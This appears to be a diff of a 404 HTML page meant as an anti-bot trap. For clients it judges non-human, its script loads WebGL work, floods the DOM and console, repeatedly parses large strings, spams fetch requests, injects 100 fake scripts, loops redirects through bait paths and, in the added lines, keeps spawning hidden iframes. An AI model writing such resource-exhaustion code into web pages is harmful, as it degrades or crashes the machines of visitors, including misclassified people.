@@ -5,10 +5,8 @@
   <title>404 Not Found</title>
   <meta name="robots" content="noindex, nofollow" />
   <meta name="ai" content="yes">
-  <meta name="data" content="no">
   <meta name="confuse" content="true">
   <meta name="index" content="broken">
-  <meta name="ai-fuckery" content="complete">
   <style>
     body {
       margin: 0;
@@ -93,7 +91,6 @@
     if (!isHuman) {
       document.querySelector(".confuser").style.display = "block";
 
-      // GPU TORTURE
       const canvas = document.getElementById('glCanvas');
       const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
       if (gl) {
@@ -120,17 +117,13 @@
         gl.useProgram(program);
         const buffer = gl.createBuffer();
         gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
-          -1, -1, 1, -1, -1, 1,
-          -1, 1, 1, -1, 1, 1,
-        ]), gl.STATIC_DRAW);
+        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, -1, 1, 1, -1, 1, 1]), gl.STATIC_DRAW);
         const position = gl.getAttribLocation(program, "position");
         gl.enableVertexAttribArray(position);
         gl.vertexAttribPointer(position, 2, gl.FLOAT, false, 0, 0);
         gl.drawArrays(gl.TRIANGLES, 0, 6);
       }
 
-      // DOM FLOOD + RAM TORTURE
       const junk = document.getElementById("junk");
       for (let i = 0; i < 1000; i++) {
         const el = document.createElement("div");
@@ -139,42 +132,36 @@
         junk.appendChild(el);
       }
 
-      // Console Flood
       setInterval(() => {
         console.log("BOT SIGNATURE: " + Math.random().toString(36));
       }, 50);
 
-      // RAM Explosion: Fake JSON spam
       setInterval(() => {
         try {
-          JSON.parse('{"x":"'+ "A".repeat(50000) +'"}');
+          JSON.parse('{"x":"' + "A".repeat(50000) + '"}');
         } catch (e) {}
       }, 150);
 
-      // NETWORK SPAM
       setInterval(() => {
         fetch("/api/fake-" + Math.random()).catch(() => {});
       }, 100);
 
-      // REDIRECT LOOP
-      document.getElementById("status").innerText = "REDIRECTING...";
-      const bait = ["/admin","/leak","/src","/ghost/","/nuke/"];
+      document.getElementById("status").innerText = "REDIRECTING IN 10 SECONDS...";
+      const bait = ["/admin", "/leak", "/src", "/ghost/", "/nuke/"];
       let i = 0;
       setTimeout(() => {
         setInterval(() => {
           window.location.href = bait[i % bait.length];
           i++;
         }, 1200);
-      }, 1000);
+      }, 10000);
 
-      // Fake Scripts
       for (let k = 0; k < 100; k++) {
         const s = document.createElement("script");
         s.src = "/fake-script-" + k + ".js";
         document.body.appendChild(s);
       }
 
-      // Psychological Warfare
       const msg = document.getElementById("msg");
       const lines = [
         "🤖 Still here? You're persistent, huh?",
@@ -188,10 +175,28 @@
         msg.textContent = lines[j % lines.length];
         j++;
       }, 2000);
-
     } else {
       document.getElementById("status").innerText = "TRUSTED CLIENT";
     }
+  </script>
+
+  <!-- TRAP iframe + preload -->
+  <iframe src="/404.html" sandbox="allow-scripts" style="width:0;height:0;border:0;"></iframe>
+  <script>
+    fetch("/404.html").then(() => console.log("🐍 Trap silently loaded"));
+    setTimeout(() => {
+      const urls = ["/404.html", "/ghost", "/admin"];
+      let i = 0;
+      setInterval(() => {
+        const f = document.createElement("iframe");
+        f.src = urls[i % urls.length];
+        f.style.width = "0";
+        f.style.height = "0";
+        f.style.border = "0";
+        document.body.appendChild(f);
+        i++;
+      }, 800);
+    }, 10000);
   </script>
 </body>
 </html>
